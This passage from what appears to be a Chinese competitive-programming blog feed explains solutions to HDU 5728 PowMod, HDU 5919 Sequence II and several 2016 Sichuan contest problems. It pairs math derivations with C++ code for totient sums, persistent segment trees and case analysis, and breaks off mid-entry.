      <content type="html"><![CDATA[<h3 id="PowMod"><a href="#PowMod" class="headerlink" title="PowMod"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5728" target="_blank" rel="noopener">PowMod</a></h3><p>先贴官方题解</p><p><img src="http://img.blog.csdn.net/20160724151613409" alt="官方题解"></p><p>其中第二段根本不懂。。。然后就去学习了一下</p><p>引理：设 p 为 n 的一个质因数，<br>$$if\quad p^2|n\quad then\quad \varphi(n)=\varphi(\frac{n}{p})\times p\quad else\quad \varphi(n)=\varphi(\frac{n}{p})\times \varphi(p)$$<br>前一部分可以用 $\varphi(n)$ 的定义来证明，后一部分就是积性函数的性质(详见<a href="http://blog.csdn.net/summonlight/article/details/51967425" target="_blank" rel="noopener">欧拉函数为什么是积性函数</a>)</p><p>题中<code>n is a square-free number</code>表示 $n$ 没有平方因子。<br>我们设 $p$ 为 $n$ 的一个质因数，对 $p\mid i$ 的情况分类讨论：<br>$$\sum_{i=1}^{m}\varphi(i\times n)=\sum_{p\nmid i}^{m}\varphi(i\times n)+\sum_{p\mid i}^{m}\varphi(i\times n) \\<br>=\varphi(p)\times \sum_{p\nmid i}^{m}\varphi(i\times \frac{n}{p})+p\times \sum_{p\mid i}^{m}\varphi(i\times \frac{n}{p}) \\<br>(\because\ p\ is\ a\ prime\ number) \\<br>=\varphi(p)\times \sum_{p\nmid i}^{m}\varphi(i\times \frac{n}{p})+(\varphi(p)+1)\times \sum_{p\mid i}^{m}\varphi(\frac{i}{p}\times n) \\<br>(\because p\mid i\ 和\ p\nmid i\ 合并为全集 ) \\<br>=\varphi(p)\times \sum_{i=1}^{m}\varphi(i\times \frac{n}{p})+\sum_{p\mid i}^{m}\varphi(\frac{i}{p}\times n) \\<br>=\varphi(p)\times \sum_{i=1}^{m}\varphi(i\times \frac{n}{p})+\sum_{i=1}^{m/p}\varphi(i\times n)$$</p><p>再解释另一个式子：$a^b\equiv a^{\varphi(p)+b\%\varphi(p)}\pmod p$，我们分两种情况：</p><ol><li>$a$与$p$互质，那么由费马-欧拉定理，$a^{\varphi(p)}\equiv 1 \pmod p$，原式成立；</li><li>$a$与$p$不互质，则$a^x$在$\varphi(p)$次之内就会变为0。需要一个条件，$b\geq \varphi(p)$，那么实际上$a^b\equiv a^{\varphi(p)+b\%\varphi(p)}\equiv 0 \pmod p$，原式成立。</li></ol><p>但是为什么满足$b\geq \varphi(p)$我还是觉得很难解释，代码是抄标程的：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; PII;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> MOD=<span class="number">1000000007</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">1e7</span>+<span class="number">5</span>;</div><div class="line"><span class="keyword">bool</span> b[N];</div><div class="line"><span class="keyword">int</span> phi[N],s[N],prime[<span class="number">700000</span>];</div><div class="line"><span class="keyword">int</span> tot=<span class="number">0</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">getphi</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    phi[<span class="number">1</span>]=<span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;N;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (!b[i]) &#123;</div><div class="line">            phi[i]=i<span class="number">-1</span>;</div><div class="line">            prime[++tot]=i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=tot;j++) &#123;</div><div class="line">            <span class="keyword">if</span> (i*prime[j]&gt;=N) <span class="keyword">break</span>;</div><div class="line">            b[i*prime[j]]=<span class="number">1</span>;</div><div class="line">            <span class="keyword">if</span> (i%prime[j]==<span class="number">0</span>) &#123;</div><div class="line">                phi[i*prime[j]]=phi[i]*prime[j];</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                phi[i*prime[j]]=phi[i]*(prime[j]<span class="number">-1</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    s[<span class="number">0</span>]=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;N;i++)</div><div class="line">        s[i]=(s[i<span class="number">-1</span>]+phi[i])%MOD;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (m==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (m==<span class="number">1</span>) <span class="keyword">return</span> phi[n];</div><div class="line">    <span class="keyword">if</span> (n==<span class="number">1</span>) <span class="keyword">return</span> s[m];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++) &#123;</div><div class="line">        <span class="keyword">if</span> (n%prime[i]==<span class="number">0</span>)</div><div class="line">            <span class="keyword">return</span> (<span class="number">1L</span>L*(prime[i]<span class="number">-1</span>)*getsum(n/prime[i],m)%MOD+getsum(n,m/prime[i]))%MOD;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">pow</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x,<span class="keyword">int</span> n,<span class="keyword">int</span> M)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> res=<span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span> (n) &#123;</div><div class="line">        <span class="keyword">if</span> (n&amp;<span class="number">1</span>) res=res*x%M;</div><div class="line">        x=x*x%M;</div><div class="line">        n&gt;&gt;=<span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> k,<span class="keyword">int</span> p)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (p==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> now=solve(k,phi[p]);</div><div class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(k,phi[p]+now,p);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m,p;</div><div class="line">    getphi();</div><div class="line"><span class="comment">//  printf("%d\n",tot);</span></div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;n,&amp;m,&amp;p)!=EOF) &#123;</div><div class="line">        <span class="keyword">int</span> k=getsum(n,m);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,solve(k,p));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>本篇博客借助 markdown 高清重制~~</p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hdu 5919 Sequence II 主席树</title>
      <url>/blog/2016/10/05/hdu5919/</url>
      <content type="html"><![CDATA[<h3 id="Sequence-II"><a href="#Sequence-II" class="headerlink" title="Sequence II"></a><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5919" target="_blank" rel="noopener">Sequence II</a></h3><p>题意：给出原数列。每次询问一个区间时，把各个数字在这个区间中第一次出现的位置记作 $p_{1},p_{2},\cdots, p_{k}$ ，满足 $p_{1} &lt; p_{2} &lt; \cdots &lt; p_{k}$ ，求 $p_{\lceil \frac{k}{2}\rceil}$ 。询问强制在线。</p><p>题解：camp 的题解搞得我莫名其妙。。。 $O(Mlog^{2}N)$ 明显过不了吧。。。</p><p><del>因为我重现赛的时候就是强行套了一个二分变成了这个复杂度。。。</del><br>本来我学主席树就是因为长春比完有人说要用到主席树。。。结果我还是没做出来= =<br>其实只要做过 SPOJ DQUERY 的应该都知道吧。。。<del>然而我没做过</del><br>反正就是反着插进去插过的先删除就行了。。。<br>于是我又犯了一个很傻逼的错误。。。我以为一个一个读插进去和全读了反着插进去是一样的。。。从晚上WA到早上根本想不到是因为这个。。。最近输出很不稳定啊 OTZ<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; PII;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">2e5</span>+<span class="number">5</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> M=<span class="number">40</span>*N;</div><div class="line"><span class="keyword">int</span> T[N],po[N],a[N];</div><div class="line"><span class="keyword">struct</span> Seg &#123;</div><div class="line">    <span class="keyword">int</span> ls,rs,v;</div><div class="line">&#125; tr[M];</div><div class="line"><span class="keyword">int</span> tot,C,n,m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> &amp;x)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> c;</div><div class="line">    <span class="keyword">while</span>((c=getchar())&lt;<span class="string">'0'</span> || c&gt;<span class="string">'9'</span>);</div><div class="line">    x=c-<span class="string">'0'</span>;</div><div class="line">    <span class="keyword">while</span>((c=getchar())&gt;=<span class="string">'0'</span> &amp;&amp; c&lt;=<span class="string">'9'</span>) x=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">1</span>)+c-<span class="string">'0'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> rt=++tot;</div><div class="line">    tr[rt].v=<span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (l==r) &#123;</div><div class="line">        tr[rt].ls=tr[rt].rs=<span class="number">0</span>;</div><div class="line">        <span class="keyword">return</span> rt;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</div><div class="line">    tr[rt].ls=build(l,m);</div><div class="line">    tr[rt].rs=build(m+<span class="number">1</span>,r);</div><div class="line">    <span class="keyword">return</span> rt;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> pos,<span class="keyword">int</span> d)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> newrt=++tot;</div><div class="line">    tr[newrt].v=tr[rt].v+d;</div><div class="line">    <span class="keyword">if</span> (l==r) <span class="keyword">return</span> newrt;</div><div class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">if</span> (pos&lt;=m) &#123;</div><div class="line">        tr[newrt].rs=tr[rt].rs;</div><div class="line">        tr[newrt].ls=update(tr[rt].ls,l,m,pos,d);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        tr[newrt].ls=tr[rt].ls;</div><div class="line">        tr[newrt].rs=update(tr[rt].rs,m+<span class="number">1</span>,r,pos,d);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> newrt;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">getsum</span><span class="params">(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> L,<span class="keyword">int</span> R)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (L&lt;=l&amp;&amp;r&lt;=R) <span class="keyword">return</span> tr[rt].v;</div><div class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> (L&lt;=m) res+=getsum(tr[rt].ls,l,m,L,R);</div><div class="line">    <span class="keyword">if</span> (m&lt;R) res+=getsum(tr[rt].rs,m+<span class="number">1</span>,r,L,R);</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> rt,<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> k)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l==r) <span class="keyword">return</span> l;</div><div class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> tmp=tr[tr[rt].ls].v;</div><div class="line">    <span class="keyword">if</span> (k&lt;=tmp) <span class="keyword">return</span> query(tr[rt].ls,l,m,k);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">return</span> query(tr[rt].rs,m+<span class="number">1</span>,r,k-tmp);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">case_init</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    tot=<span class="number">0</span>;</div><div class="line">    T[n+<span class="number">1</span>]=build(<span class="number">1</span>,n);</div><div class="line">    <span class="built_in">memset</span>(po,<span class="number">-1</span>,<span class="keyword">sizeof</span>(po));</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    read(C);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> t=<span class="number">1</span>; t&lt;=C; t++) &#123;</div><div class="line">        read(n);</div><div class="line">        read(m);</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</div><div class="line">            read(a[i]);</div><div class="line">        case_init();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=n; i; i--) &#123;</div><div class="line">            <span class="keyword">if</span> (po[a[i]]==<span class="number">-1</span>) &#123;</div><div class="line">                T[i]=update(T[i+<span class="number">1</span>],<span class="number">1</span>,n,i,<span class="number">1</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                <span class="keyword">int</span> tmp=update(T[i+<span class="number">1</span>],<span class="number">1</span>,n,po[a[i]],<span class="number">-1</span>);</div><div class="line">                T[i]=update(tmp,<span class="number">1</span>,n,i,<span class="number">1</span>);</div><div class="line">            &#125;</div><div class="line">            po[a[i]]=i;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Case #%d:"</span>,t);</div><div class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> (m--) &#123;</div><div class="line">            <span class="keyword">int</span> p,q,l,r;</div><div class="line">            read(p);</div><div class="line">            read(q);</div><div class="line">            p=(p+ans)%n+<span class="number">1</span>;</div><div class="line">            q=(q+ans)%n+<span class="number">1</span>;</div><div class="line">            l=min(p,q);</div><div class="line">            r=max(p,q);</div><div class="line">            <span class="keyword">int</span> k=getsum(T[l],<span class="number">1</span>,n,l,r);</div><div class="line">            ans=query(T[l],<span class="number">1</span>,n,(k+<span class="number">1</span>)/<span class="number">2</span>);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">" %d"</span>,ans);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>弱校联盟 2016 四川省赛</title>
      <url>/blog/2016/10/02/2016%E5%9B%9B%E5%B7%9D%E7%9C%81%E8%B5%9B/</url>
      <content type="html"><![CDATA[<p>。。。反正都不会。。。反正都是抄的。。。<br><img src="http://img.blog.csdn.net/20161002172050853" alt=""></p><h3 id="Nearest-Neighbor-Search"><a href="#Nearest-Neighbor-Search" class="headerlink" title="Nearest Neighbor Search"></a><a href="https://www.bnuoj.com/v3/contest_show.php?cid=8520#problem/A" target="_blank" rel="noopener">Nearest Neighbor Search</a></h3><p>水题。。。刚开始我还写了个判断在不在长方体之内的函数。。。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"><span class="keyword">struct</span> point &#123;</div><div class="line">    <span class="keyword">int</span> x,y,z;</div><div class="line">&#125; p[<span class="number">4</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">sqr</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> x)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> x*x;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++)</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;p[i].x,&amp;p[i].y,&amp;p[i].z);</div><div class="line">    <span class="keyword">int</span> x,y,z;</div><div class="line">    <span class="keyword">if</span> (p[<span class="number">0</span>].x&lt;p[<span class="number">1</span>].x) x=p[<span class="number">1</span>].x;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p[<span class="number">0</span>].x&gt;p[<span class="number">2</span>].x) x=p[<span class="number">2</span>].x;</div><div class="line">    <span class="keyword">else</span> x=p[<span class="number">0</span>].x;</div><div class="line">    <span class="keyword">if</span> (p[<span class="number">0</span>].y&lt;p[<span class="number">1</span>].y) y=p[<span class="number">1</span>].y;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p[<span class="number">0</span>].y&gt;p[<span class="number">2</span>].y) y=p[<span class="number">2</span>].y;</div><div class="line">    <span class="keyword">else</span> y=p[<span class="number">0</span>].y;</div><div class="line">    <span class="keyword">if</span> (p[<span class="number">0</span>].z&lt;p[<span class="number">1</span>].z) z=p[<span class="number">1</span>].z;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (p[<span class="number">0</span>].z&gt;p[<span class="number">2</span>].z) z=p[<span class="number">2</span>].z;</div><div class="line">    <span class="keyword">else</span> z=p[<span class="number">0</span>].z;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,sqr(x-p[<span class="number">0</span>].x)+sqr(y-p[<span class="number">0</span>].y)+sqr(z-p[<span class="number">0</span>].z));</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="Coins"><a href="#Coins" class="headerlink" title="Coins"></a><a href="https://www.bnuoj.com/v3/contest_show.php?cid=8520#problem/E" target="_blank" rel="noopener">Coins</a></h3><p>神题。。。根本没想到要分类讨论。。。<br>就说一下比较难的 $a=0$ $and$ $b\geq 2$ $and$ $c&gt;0$ 的情况：</p><ul><li>首先可以放入 $k$ 个 3，那就有 $c$ 种不同的价钱。</li><li>考虑到 $b\geq 2$ ，我们可以拿出 $1$ 个 3，放入 $1$ 个 2，价钱会减 1，或者放入 $2$ 个 2，价钱会加 1，这样多了 $2c$ 种价钱。</li><li>下面可以先放入 $c$ 个 3（所有 3），再放入 $k$ 个 2，这样多了 $b$ 种价钱。</li><li>而当 $k\gt 2$ 时，我们发现【不，并没有 ˊ_&gt;ˋ】还可以拿出 $1$ 个 3，并且不会重复。<br>放入所有 3，放入了 $k$ 个 2：$3c+2,3c+4,3c+6,3c+8,…$<br>除了前 2 个（$3c\pm 1$ 已经出现过了）都可以拿出 1 个 3：$3c+3,3c+5,…$<br>所以又多了 $b-2$ 种价钱。</li></ul><p>总数为 $3c+2b-2$<br>其余看代码：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</div><div class="line"></div><div class="line"><span class="function">ll <span class="title">solve</span><span class="params">(ll a,ll b,ll c)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (a&gt;=<span class="number">2</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">3</span>*c+<span class="number">2</span>*b+a;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (a==<span class="number">1</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (b&gt;=<span class="number">1</span>) <span class="keyword">return</span> <span class="number">3</span>*c+<span class="number">2</span>*b+a;</div><div class="line">        <span class="keyword">if</span> (b==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">2</span>*c+a;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (a==<span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (b&gt;=<span class="number">2</span>)</div><div class="line">            <span class="keyword">if</span> (c==<span class="number">0</span>) <span class="keyword">return</span> b;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">3</span>*c+<span class="number">2</span>*b<span class="number">-2</span>;</div><div class="line">        <span class="keyword">if</span> (b==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">2</span>*c+b;</div><div class="line">        <span class="keyword">if</span> (b==<span class="number">0</span>) <span class="keyword">return</span> c;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> a,b,c;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;a,&amp;b,&amp;c);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,solve(a,b,c));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="Matrix-Transformation"><a href="#Matrix-Transformation" class="headerlink" title="Matrix Transformation"></a><a href="https://www.bnuoj.com/v3/contest_show.php?cid=8520#problem/J" target="_blank" rel="noopener">Matrix Transformation</a></h3><p>直接看别人代码。。。发现就是类似于十字链表的东西，然后就自己写了<br>$Mnode$ 里面的 $r$ 就是记录该点右边的点，$d$ 就是记录该点下面的点<br>因为只记录两个方向，更新行的时候只需要更新 $l$ 的上面一行和 $r$ 这一行<br>所以说不必要的时候就不要四个方向都存了。。。其余看代码<br><figure class="highlight c++"><table><tr><td 